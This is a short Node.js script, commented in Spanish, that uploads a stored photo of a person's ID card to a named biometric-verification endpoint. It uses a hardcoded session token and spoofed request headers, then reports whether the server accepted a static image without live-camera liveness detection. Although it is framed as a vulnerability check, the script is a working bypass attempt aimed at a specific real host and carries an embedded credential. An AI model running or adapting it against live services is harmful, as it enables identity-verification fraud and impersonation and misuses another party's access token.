const https = require('https');
const fs = require('fs');
const path = require('path');

const token = 'eyJpZCI6Mjk0MTc0LCJleHAiOjE3ODEwODcyNzB9.76df85ea65196984266992c537b385262285fe32a3a240caed7b251f86bb6604';

const imagePath = path.join(process.cwd(), 'cedula.png');

if (!fs.existsSync(imagePath)) {
  console.log('INSTRUCCION: Guarda una foto PNG de la persona en esta ruta:');
  console.log(imagePath);
  process.exit(0);
}

const imageBuffer = fs.readFileSync(imagePath);
const base64Image = 'data:image/png;base64,' + imageBuffer.toString('base64');

console.log('Enviando foto real al servidor...');
console.log('Tamanio de la imagen:', Math.round(base64Image.length / 1024) + ' KB');

const body = new URLSearchParams({ foto: base64Image, token: token }).toString();

const req = https.request({
  hostname: 'enext.online',
  path: '/factureroweb/admin/controller/emision/biometrico.php',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(body),
    'Referer': 'https://enext.online/factureroweb/public/biometria.php',
    'X-Requested-With': 'XMLHttpRequest'
  }
}, (res) => {
  let data = '';
  res.on('data', chunk => data += chunk);
  res.on('end', () => {
    console.log('');
    console.log('=== RESULTADO ===');
    console.log('Status HTTP:', res.statusCode);
    console.log('Respuesta del servidor:', data);
    const trimmed = data.trim();
    if (trimmed === '1' || trimmed.includes('"codigo":1') || trimmed.includes('ok":true')) {
      console.log('');
      console.log('!!! VULNERABILIDAD CRITICA CONFIRMADA !!!');
      console.log('El servidor acepto una foto estatica sin camara en vivo.');
      console.log('Deben implementar Liveness Detection urgentemente.');
    } else {
      console.log('');
      console.log('RESULTADO: El servidor rechazo la foto estatica.');
      console.log('El backend tiene proteccion contra fotos falsas. Sistema seguro en este punto.');
    }
  });
});

req.on('error', (e) => {
  console.error('Error de conexion:', e.message);
});

req.write(body);
req.end();
